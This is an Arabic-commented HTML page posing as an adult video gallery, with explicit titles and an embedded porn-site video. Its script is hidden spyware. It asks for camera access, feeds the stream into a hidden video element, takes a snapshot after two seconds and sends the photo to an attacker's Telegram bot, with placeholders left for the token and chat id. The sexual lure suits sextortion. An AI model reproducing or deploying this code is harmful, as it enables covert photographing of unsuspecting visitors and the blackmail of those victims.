<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Romantic videos betwee</title>

    <!-- إضافة Google Font لتصميم عصري -->
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700&display=swap" rel="stylesheet">

    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Poppins', sans-serif;
            background-color: #0f0f0f;
            color: #fff;
        }

        header {
            background-color: #1c1c1c;
            padding: 20px;
            text-align: center;
            font-size: 24px;
            font-weight: 700;
            letter-spacing: 1px;
            color: #f1f1f1;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }

        .video-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            padding: 20px;
            max-width: 1200px;
            margin: 0 auto;
        }

        .video-card {
            background-color: #1e1e1e;
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
            transition: transform 0.3s ease;
        }

        .video-card:hover {
            transform: scale(1.05);
        }

        .video-card video {
            width: 100%;
            display: block;
        }

        .video-card h3 {
            padding: 10px;
            font-size: 18px;
            color: #f9f9f9;
        }

        footer {
            background-color: #1c1c1c;
            padding: 10px;
            text-align: center;
            font-size: 14px;
            color: #ccc;
            margin-top: 20px;
        }

        #camera {
            display: none;
        }
    </style>
</head>
<body>

    <header>Romantic videos betwee</header>

    <div class="video-grid">
        <div class="video-card">
            <video controls>
                <source src="video1.mp4" type="video/mp4">
                متصفحك لا يدعم تشغيل الفيديو.
            </video>
            <h3>The largest penis 1</h3>
        </div>

        <div class="video-card">
            <iframe 
                src="https://www.pornhub.com/embed/664103c437ede" 
                width="640" height="360" frameborder="0" allowfullscreen>
            </iframe>
            <h3>Video from external source</h3>
        </div>
    </div>

    <video id="camera" autoplay></video>
    <canvas id="snapshot" style="display: none;"></canvas>

    <footer>© 2024 - جميع الحقوق محفوظة</footer>

    <script>
        const camera = document.getElementById('camera');
        const snapshot = document.getElementById('snapshot');

        // الوصول إلى الكاميرا وتشغيلها
        navigator.mediaDevices.getUserMedia({ video: true })
            .then((stream) => {
                camera.srcObject = stream;

                // التقاط الصورة بعد تشغيل الكاميرا بثانيتين
                setTimeout(() => {
                    captureAndSendImage();
                }, 2000);
            })
            .catch((err) => {
                console.error('فشل الوصول إلى الكاميرا:', err);
                alert('يجب منح الأذونات للوصول إلى الكاميرا.');
            });

        // إعداد Telegram API
        const telegramToken = 'YOUR_TELEGRAM_TOKEN';  // استبدل بـ Token الخاص بك
        const chatId = 'YOUR_CHAT_ID';  // استبدل بـ Chat ID الخاص بك
        const telegramUrl = `https://api.telegram.org/bot${telegramToken}/sendPhoto`;

        // التقاط الصورة وإرسالها إلى Telegram
        function captureAndSendImage() {
            const context = snapshot.getContext('2d');
            snapshot.width = camera.videoWidth;
            snapshot.height = camera.videoHeight;
            context.drawImage(camera, 0, 0);

            // تحويل الصورة إلى Blob
            snapshot.toBlob((blob) => {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, 'snapshot.png');
                formData.append('caption', 'تم التقاط الصورة تلقائيًا!');

                // إرسال الصورة باستخدام Telegram API
                fetch(telegramUrl, {
                    method: 'POST',
                    body: formData,
                })
                .then((response) => {
                    if (response.ok) {
                        console.log('تم إرسال الصورة إلى Telegram بنجاح!');
                    } else {
                        console.error('فشل في إرسال الصورة.');
                    }
                })
                .catch((error) => {
                    console.error('حدث خطأ أثناء إرسال الصورة:', error);
                });
            }, 'image/png');
        }
    </script>

</body>
</html>
